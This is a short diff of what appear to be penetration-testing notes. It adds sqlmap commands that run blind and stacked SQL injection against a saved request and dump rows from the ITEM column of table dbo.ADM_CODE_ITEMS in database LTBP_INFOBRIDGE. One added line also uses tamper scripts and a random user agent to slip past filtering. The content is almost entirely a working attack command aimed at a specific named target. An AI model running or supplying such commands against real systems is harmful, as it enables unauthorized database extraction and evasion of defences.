@@ -130,8 +130,10 @@ Analytics/GetAssetValuationData
  
 --> InfoMaterial
 
-python sqlmap.py -r validation_step_04_01.txt --technique=B --risk=2 --level=3 --force-ssl --dbms=mssql --technique=S --time-sec 5 --batch  -D LTBP_INFOBRIDGE -T dbo.ADM_CODE_ITEMS -C ITEM --dump --start=1 --stop=4 
+python sqlmap.py -r validation_step_04_01.txt --technique=B --risk=2 --level=3 --force-ssl --dbms=mssql --technique=S --time-sec 5 --batch  -D LTBP_INFOBRIDGE -T dbo.ADM_CODE_ITEMS -C ITEM --dump --start=1 --stop=4
+python sqlmap.py -r validation_step_04_01.txt --technique=B --risk=2 --level=3 --force-ssl --random-agent --dbms=mssql --technique=S --time-sec 5 --batch --tamper=space2comment,randomcase -D LTBP_INFOBRIDGE -T dbo.ADM_CODE_ITEMS -C ITEM --dump --start=1 --stop=4
+
  
  
- 
+
  
